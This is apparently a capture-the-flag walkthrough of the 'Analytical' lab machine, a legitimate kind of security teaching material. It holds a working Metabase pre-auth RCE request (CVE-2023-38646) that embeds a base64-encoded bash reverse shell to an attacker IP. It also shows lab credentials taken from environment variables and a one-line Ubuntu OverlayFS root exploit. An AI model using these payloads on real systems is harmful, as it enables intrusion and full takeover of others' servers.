# Analytical

## Enumeration:

Start off with an NMAP scan:
```bash
Nmap scan report for 10.10.11.233
Host is up (0.20s latency).
Not shown: 61570 closed tcp ports (conn-refused), 3963 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This leaks the `analytical.htb` domain name. Subdirectory fuzz on this domain doesn't reveal anything.  

Subdomain Fuzz discovers the `data.analytical.htb` subdomain. This is a Metabase WebApp which redirects us to `/auth/login`. 

Performing a Subdirectory Fuzz for `data.analytical.htb`displays the following subdirectories and endpoints:
- /api
- /app
- /public
- /embed
- /auth

## Exploit:

While looking around for an exploit for Metabase, we come across [CVE-2023-38646](https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396). This CVE also has the following [Proof-of-Concept](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/).

We can obtain the `setup-token` from `api/session/properties`, which we can use to make the following POST request:
```http
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: metabase.DEVICE=97ae2e52-ac3d-42b4-99be-f05281becfba
Connection: close
Content-Type: application/json
Content-Length: 826


{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNjMvOTAwMCAwPiYxCg}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

The exploit revolves around `/api/setup/validate` endpoint which is used to validate JDBC connections and then performs an SQLi on the H2 db driver. You can edit the base64 string provided with your own reverse shell. 

This gives us a foothold on the server, however we find out that we are in a docker container.

Running `env` to show environmental variables shows you the following credentials:

```bash
$ env

SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=24f6be72f356
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

This reveals the following credentials- `metalytics:An4lytics_ds20223#`

We can use those credentials to SSH onto the server. User Flag can be found in `/home/metalytics/user.txt`
## Privilege Escalation:

Looking into the machine, We can see that its running the following:
```bash
metalytics@analytics:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

This particular version of Ubuntu is vulnerable to a LPE (Local Privilege Escalation) exploit: [Priv Esc](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?rdt=38239)

We can use the following as a Proof-of-Concept:
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("chmod +s /bin/bash")'
```

Running `bash -p` will give you a root shell. Root Flag can be found in `/root/root.txt`
